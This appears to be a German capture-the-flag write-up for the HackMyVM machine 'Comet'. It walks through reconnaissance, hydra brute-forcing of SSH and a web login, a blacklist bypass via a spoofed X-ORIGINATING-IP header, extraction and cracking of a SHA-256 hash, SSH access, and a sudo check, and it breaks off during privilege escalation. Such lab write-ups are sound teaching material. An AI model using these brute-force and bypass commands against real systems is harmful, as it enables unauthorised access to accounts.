@@ -1,0 +1,700 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comet - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Comet - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe (Gelb/Orange) muss im CSS für diese Klasse definiert werden -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Klassen steuern die Farbe (Gelb/Orange) gemäß CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sort</div>
+                <div class="tool-item">uniq</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">sed</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">python http.server</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">md5collgen</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">md5sum</div>
+                <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.122	08:00:27:9e:28:2e	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Geräten gescannt. Ein Host mit der IP <code>192.168.2.122</code> und einer MAC-Adresse von Oracle (VirtualBox) wird identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wurde erfolgreich lokalisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP <code>192.168.2.122</code> für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Standard-Netzwerkaktivität.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO 192.168.2.122 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 01:45 CEST
+Nmap scan report for comet.hmv (192.168.2.122)
+Host is up (0.0028s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 dbf946e520816ceec72508ab2251366c (RSA)
+|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
+|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: CyberArray
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:9E:28:2E (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 2.6.32 or 3.10 (92%), Linux 2.6.32 (91%), Linux 4.4 (91%), Linux 2.6.32 - 2.6.35 (90%), Linux 2.6.32 - 2.6.39 (90%), Linux 2.6.32 - 3.0 (88%), Linux 4.0 (88%), Linux 3.11 - 4.1 (88%), Linux 3.2 - 3.8 (88%), Linux 2.6.18 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.77 ms comet.hmv (192.168.2.122)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (-sS, -sC, -sV, -T5, -AO, -p-) identifiziert zwei offene Ports auf dem Zielsystem:
+                <ul>
+                    <li>Port <code>22</code>: OpenSSH 8.4p1 (Debian 11 Basis).</li>
+                    <li>Port <code>80</code>: Apache httpd 2.4.54 (Debian) mit dem Seitentitel "CyberArray".</li>
+                </ul>
+                 Das Betriebssystem wird als Linux erkannt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche ist relativ klein und beschränkt sich auf SSH und HTTP. Der Webserver ist der wahrscheinlichste Einstiegspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Webserver auf Port 80 detailliert untersuchen (Verzeichnisse, Dateien, Schwachstellen). SSH für spätere Passwortangriffe vormerken.<br><strong>Empfehlung (Admin):</strong> Dienste aktuell halten, nicht benötigte Ports schließen.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.122  -x txt,php,[...] -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+<span class="command">http://192.168.2.122/images</span>               [Size: 315] [--> http://192.168.2.122/images/]
+<span class="command">http://192.168.2.122/contact.html</span>         [Size: 5886]
+<span class="command">http://192.168.2.122/about.html</span>           [Size: 7024]
+<span class="command">http://192.168.2.122/blog.html</span>            [Size: 8242]
+<span class="command">http://192.168.2.122/support.html</span>         [Size: 6329]
+<span class="command">http://192.168.2.122/login.php</span>            [Size: 1443]
+<span class="command">http://192.168.2.122/index.html</span>           [Size: 7097]
+<span class="command">http://192.168.2.122/ip.txt</span>               [Size: 0]
+<span class="command">http://192.168.2.122/js</span>                   [Size: 311] [--> http://192.168.2.122/js/]
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird zur Verzeichnissuche auf dem Webserver eingesetzt. Es findet Standard-Webseiten (`index.html`, `contact.html` etc.), Verzeichnisse (`/images`, `/js`), eine leere Datei `ip.txt` und eine Login-Seite `login.php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Login-Seite `login.php` ist der interessanteste Fund und ein primäres Ziel für weitere Angriffe. Die leere `ip.txt` ist ungewöhnlich und könnte später relevant werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die `login.php`-Seite untersuchen (Parameter, Authentifizierungsmechanismus). Die Funktion von `ip.txt` beobachten.<br><strong>Empfehlung (Admin):</strong> Unnötige Dateien (wie eine leere `ip.txt`) entfernen. Login-Seiten gegen Brute-Force absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nikto -h http://192.168.2.122 -C all</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.122
++ Target Hostname:    192.168.2.122
++ Target Port:        80
++ Start Time:         2023-04-10 01:46:02 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: ...
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> See: ...
++ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: 1bb9, size: 5f50f4bf1b6c0, mtime: gzip.</span> See: CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /ip.txt: This may be User Online version 2.0, which has a remotely accessible log file. <!-- Interessante Vermutung von Nikto -->
++ <span class="password">/images/: Directory indexing found.</span>
++ <span class="password">/login.php: Admin login page/section found.</span>
++ 26646 requests: 6 error(s) and 7 item(s) reported on remote host
++ End Time:           2023-04-10 01:49:21 (GMT2) (199 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nikto findet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), ein potenzielles Inode-Leak über ETags (geringes Risiko), Directory Indexing für `/images/` und bestätigt die Login-Seite `/login.php`. Interessanterweise vermutet Nikto aufgrund von `/ip.txt`, dass es sich um eine spezifische Software ("User Online 2.0") handeln könnte, die Logdateien preisgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Gobuster-Funde und fügt Hinweise auf fehlende Header und die mögliche Funktion von `ip.txt` hinzu. Das Directory Indexing für `/images/` sollte untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `/images/` manuell prüfen. Die Vermutung bezüglich `ip.txt` und Logdateien weiter untersuchen (z.B. nach Standard-Logdateipfaden dieser Software suchen). Den Fokus auf `login.php` richten.<br><strong>Empfehlung (Admin):</strong> Sicherheitsheader hinzufügen, Directory Indexing deaktivieren, ETag-Konfiguration prüfen, ggf. Software "User Online" aktualisieren/absichern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.122/login.php?FUZZ=id" --hw 97</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.122/login.php?FUZZ=id
+Total requests: 220607
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: ??? <!-- Zeit fehlt im Original -->
+Processed Requests: 220607
+Filtered Requests: 220607
+Requests/sec.: ??? <!-- Rate fehlt im Original -->
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `wfuzz` Parameter auf der `login.php`-Seite zu finden, die möglicherweise für Command Injection anfällig sein könnten (`?FUZZ=id`). Der Scan filtert alle Antworten heraus, die 97 Wörter haben (`--hw 97`), was vermutlich der Wortanzahl der Standard-Antwort entspricht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische Fuzzing-Versuch auf `login.php` war erfolglos, es wurden keine abweichenden Antworten und somit keine offensichtlichen Injection-Punkte gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Angriffsmethoden für `login.php` prüfen, insbesondere Brute-Force auf die Login-Parameter.<br><strong>Empfehlung (Admin):</strong> Eingabevalidierung auf allen Parametern implementieren.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://192.168.2.122 -t 64</span></div>
+                    <!-- Keine Ausgabe im Original, impliziert Fehlschlag -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird ein Brute-Force-Angriff mit Hydra auf den SSH-Dienst für den Benutzernamen `admin` gestartet, unter Verwendung einer Passwortliste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Versuch scheint fehlgeschlagen zu sein, da kein Passwort gefunden wurde und im nächsten Schritt ein Angriff auf das Web-Login erfolgt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erst gültige Benutzernamen finden, bevor SSH-Brute-Force versucht wird. Fokus auf das Web-Login.<br><strong>Empfehlung (Admin):</strong> SSH-Brute-Force-Schutz implementieren (fail2ban, Key-Auth).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">curl -H "X-ORIGINATING-IP: Not Blacklisted :)" -d "username=admin&password=1234" -X POST http://comet.hmv/login.php</span></div>
+                     <!-- Keine Ausgabe im Original -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein manueller Login-Versuch per `curl` auf `login.php` für den Benutzer `admin`. Auffällig ist der benutzerdefinierte Header `X-ORIGINATING-IP`. Dies deutet darauf hin, dass möglicherweise eine IP-basierte Blacklist umgangen werden muss, indem dieser Header gesetzt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Hinweis auf einen potenziellen Schutzmechanismus und dessen Umgehung. Der Header `X-ORIGINATING-IP` wird wahrscheinlich von der Anwendung ausgewertet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den `X-ORIGINATING-IP`-Header beim Brute-Force-Angriff auf das Web-Login verwenden.<br><strong>Empfehlung (Admin):</strong> Sicherheitsmechanismen überprüfen. Wenn Header zur Umgehung von IP-Sperren verwendet werden können, ist der Schutz unwirksam. Serverseitige Logik statt auf Client-Header vertrauen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.2.122 http-post-form "/login.php:username=admin&password=^PASS^:H=X-ORIGINATING-IP:test:F=Invalid"</span></div>
+                    <pre>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-10 02:01:49
+[...]
+[DATA] attacking http-post-form://192.168.2.122:80/login.php:username=admin&password=^PASS^:H=X-ORIGINATING-IP:test:F=Invalid
+[...]
+[80][http-post-form] host: 192.168.2.122   login: admin   <span class="password">password: solitario</span>
+
+1 of 1 target successfully completed, 1 valid password found
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hydra wird nun für einen HTTP-POST-Form-Brute-Force-Angriff auf `login.php` konfiguriert:
+                <ul>
+                    <li><code>-l admin</code>: Benutzername.</li>
+                    <li><code>-P /usr/share/wordlists/rockyou.txt</code>: Passwortliste.</li>
+                    <li><code>192.168.2.122 http-post-form "/login.php:..."</code>: Ziel und Modul.</li>
+                    <li><code>username=admin&password=^PASS^</code>: Formularparameter, `^PASS^` wird durch Hydra ersetzt.</li>
+                    <li><code>H=X-ORIGINATING-IP:test</code>: Sendet den benutzerdefinierten Header mit einem beliebigen Wert.</li>
+                    <li><code>F=Invalid</code>: Definiert "Invalid" als Fehlerstring in der Antwort, um fehlgeschlagene Logins zu erkennen.</li>
+                </ul>
+                Hydra findet erfolgreich das Passwort `solitario` für den Benutzer `admin`.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Login für den Web-Admin (`admin:solitario`) wurde gefunden. Die Umgehung der IP-Sperre mittels Header war erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sich als `admin` in die Webanwendung einloggen und nach weiteren Informationen oder Schwachstellen suchen (z.B. Datei-Upload, Code-Ausführung, Informationslecks).<br><strong>Empfehlung (Admin):</strong> IP-Sperrmechanismus überarbeiten. Starke Passwörter erzwingen.</p>
+
+            <p class="analysis"><strong>Analyse (Nach dem Login):</strong> Nach dem Login als `admin` wird ein Verzeichnis `/logFire/` entdeckt, das zahlreiche `firewall.log.*`-Dateien enthält.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Verzeichnisinhalt von /logFire/ -->
+                    <pre>
+[ ]	firewall.log	2023-02-19 16:35 	6.8K
+[ ]	firewall.log.1	2023-02-19 16:35 	6.8K
+[...]
+[ ]	firewall.log.20	2023-02-19 16:35 	6.8K
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Log-Dateien sind oft eine Quelle für sensible Informationen. Das Vorhandensein vieler rotierter Logs deutet auf kontinuierliche Aktivität hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Log-Dateien herunterladen und analysieren.<br><strong>Empfehlung (Admin):</strong> Zugriff auf Log-Verzeichnisse über das Web einschränken. Sicherstellen, dass Logs keine sensiblen Daten enthalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/comet/logfiles]
+└─# <span class="command">for i in {1..51};do wget "http://192.168.2.122/logFire/firewall.log.$i"; done</span></div>
+                    <pre>
+--2023-04-10 02:05:55--  http://192.168.2.122/logFire/firewall.log.1
+Verbindungsaufbau zu 192.168.2.122:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 6999 (6,8K)
+Wird in »firewall.log.1« gespeichert.
+[...]
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Log-Dateien `firewall.log.1` bis `firewall.log.51` werden mittels einer `for`-Schleife und `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur Offline-Analyse der Logs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die heruntergeladenen Dateien analysieren.<br><strong>Empfehlung (Admin):</strong> Monitoring von Massen-Downloads.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/comet/logfiles]
+└─# <span class="command">cat * | sort | uniq -u</span></div> <!-- Annahme: cat * wurde ausgeführt -->
+                    <pre>
+2023-02-19 16:35:31 192.168.1.10 | 192.168.1.50 | Allowed | Inbound connection | <span class="command">Joe</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Alle heruntergeladenen Log-Dateien werden zusammengefügt (`cat *`), sortiert (`sort`) und dann werden nur die Zeilen ausgegeben, die genau einmal vorkommen (`uniq -u`). Dadurch wird eine Zeile gefunden, die eine erlaubte eingehende Verbindung von `192.168.1.10` nach `192.168.1.50` erwähnt und den Namen `Joe` enthält.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein potenzieller Benutzername (`Joe`) wurde in den Logs gefunden. Dies ist ein wichtiger Hinweis für weitere Angriffsversuche, insbesondere auf SSH.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, sich als `Joe` per SSH anzumelden. Das Passwort könnte in den Logs oder in der `firewall_update`-Datei versteckt sein.<br><strong>Empfehlung (Admin):</strong> Log-Formate und -Inhalte auf sensible Informationen überprüfen. Anonymisierung oder Maskierung von Benutzernamen in Logs erwägen.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine Datei namens `firewall_update` (Herkunft unklar, vermutlich Download nach Admin-Login) wird mit `strings` untersucht.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">strings firewall_update -n 8</span></div>
+                    <pre>
+/lib64/ld-linux-x86-64.so.2
+[...]
+<span class="command">b8728ab8H</span>
+<span class="command">1a3c3391H</span>
+<span class="command">f5f63f39H</span>
+<span class="command">da72ee89H</span>
+<span class="command">f43f9a9fH</span>
+<span class="command">429bc8cfH</span>
+<span class="command">e858f804H</span>
+<span class="command">8eaad2b1H</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `strings` extrahiert mehrere 8-stellige hexadezimale Zeichenketten, die alle mit `H` enden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Zeichenketten sehen wie Teile eines Passwort-Hashes oder eines Schlüssels aus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Strings extrahieren, bereinigen (das 'H' entfernen), zusammenfügen und versuchen, den resultierenden Hash zu knacken.</p>
+
+             <!-- Hash-Verarbeitung -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hash</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat hash</span></div>
+                    <pre>
+b8728ab8H
+1a3c3391H
+f5f63f39H
+da72ee89H
+f43f9a9fH
+429bc8cfH
+e858f804H
+8eaad2b1H
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sed -i 's/H//g' hash</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat hash</span></div>
+                    <pre>
+b8728ab8
+1a3c3391
+f5f63f39
+da72ee89
+f43f9a9f
+429bc8cf
+e858f804
+8eaad2b1
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat hash | tr -d "\n"</span></div>
+                    <pre>
+b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1" > hash</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die extrahierten Strings werden in eine Datei `hash` geschrieben. Mit `sed` wird das `H` am Ende jeder Zeile entfernt. Mit `tr -d "\n"` werden die Zeilenumbrüche entfernt, um einen einzelnen String zu erhalten. Dieser String wird final in die Datei `hash` geschrieben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der potenzielle Hash (`b8728...d2b1`) wurde erfolgreich extrahiert und für Hashcat vorbereitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hash-Typ identifizieren (sieht nach SHA-256 aus) und mit Hashcat knacken.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hashcat -a 0 -m 1400 hash /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+hashcat (v6.2.6) starting
+[...]
+Dictionary cache built:
+ Filename..: /usr/share/wordlists/rockyou.txt
+[...]
+<span class="password">b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1:prettywoman</span>
+
+[...]
+Session..........: hashcat
+Status...........: <span class="password">Cracked</span>
+Hash.Mode........: 1400 (SHA-256)
+Hash.Target......: b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1
+Time.Started.....: [...]
+Time.Estimated...: [...]
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+[...]
+Recovered........: 1/1 (100.00%) Digests
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hashcat wird mit Modus 1400 (SHA-256) und der `rockyou.txt`-Wortliste auf den extrahierten Hash angesetzt. Das Passwort `prettywoman` wird erfolgreich gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Passwort, wahrscheinlich für den Benutzer `Joe`, wurde geknackt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sich als `joe` mit dem Passwort `prettywoman` per SSH anmelden.<br><strong>Empfehlung (Admin):</strong> Starke, einzigartige Passwörter verwenden. Hashes nicht in Binärdateien speichern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/comet/logfiles]
+└─# <span class="command">ssh joe@comet.hmv</span></div>
+                    <pre>
+The authenticity of host 'comet.hmv (192.168.2.122)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+[...]
+joe@comet.hmv's password: <span class="password">prettywoman</span>
+Linux comet.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+[...]
+<span class="password">joe@comet:~$</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der SSH-Login als Benutzer `joe` mit dem geknackten Passwort `prettywoman` ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der initiale Zugriff als Benutzer `joe` wurde erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Umgebung als `joe` untersuchen, User-Flag suchen, nach Eskalationsmöglichkeiten suchen (`sudo -l`).<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 32
+drwxr-xr-x 3 joe  joe  4096 Feb 19 10:51 .
+drwxr-xr-x 3 root root 4096 Feb 19 19:33 ..
+lrwxrwxrwx 1 root root    9 Feb 25 17:03 .bash_history -> /dev/null
+-rw-r--r-- 1 joe  joe   220 Feb 19 10:51 .bash_logout
+-rw-r--r-- 1 joe  joe  3526 Feb 19 10:51 .bashrc
+<span class="command">-rwxr-xr-x 1 root root  366 Feb 19 10:51 coll</span> <!-- Gehört root! -->
+drwxr-xr-x 3 joe  joe  4096 Feb 19 10:51 .local
+-rw-r--r-- 1 joe  joe   807 Feb 19 10:51 .profile
+<span class="command">-rwx------ 1 joe  joe    33 Feb 19 10:51 user.txt</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">cc32dbc17ec3ddf89f9e6d0991c82616</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `joe` wird die `user.txt`-Datei gefunden und ausgelesen. Auffällig ist auch das Skript `coll`, das `root` gehört, aber für alle ausführbar ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden. Das Skript `coll` ist verdächtig und muss untersucht werden, insbesondere im Zusammenhang mit möglichen sudo-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. `sudo -l` ausführen und das `coll`-Skript analysieren.<br><strong>Empfehlung (Admin):</strong> Dateiberechtigungen prüfen. Skripte im Home-Verzeichnis von Benutzern, die root gehören, sind ungewöhnlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">file coll</span></div>
+                    <pre>
+coll: Bourne-Again shell script, ASCII text executable
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `file` bestätigt, dass `coll` ein Bash-Skript ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigung des Dateityps.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Inhalt analysieren und `sudo -l` prüfen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen erforderlich.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for joe on comet:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joe may run the following commands on comet:
+    <span class="password">(ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` zeigt, dass der Benutzer `joe` das Skript `/home/joe/coll` mittels `/bin/bash` als beliebiger Benutzer (implizit `root`) ohne Passwort ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Privilegieneskalationsvektor!** Da `joe` das Skript `/home/joe/coll` nicht selbst ändern kann (es gehört `root`), muss das Skript selbst eine Schwachstelle enthalten, die ausgenutzt werden kann, wenn es als `root` läuft.</p>
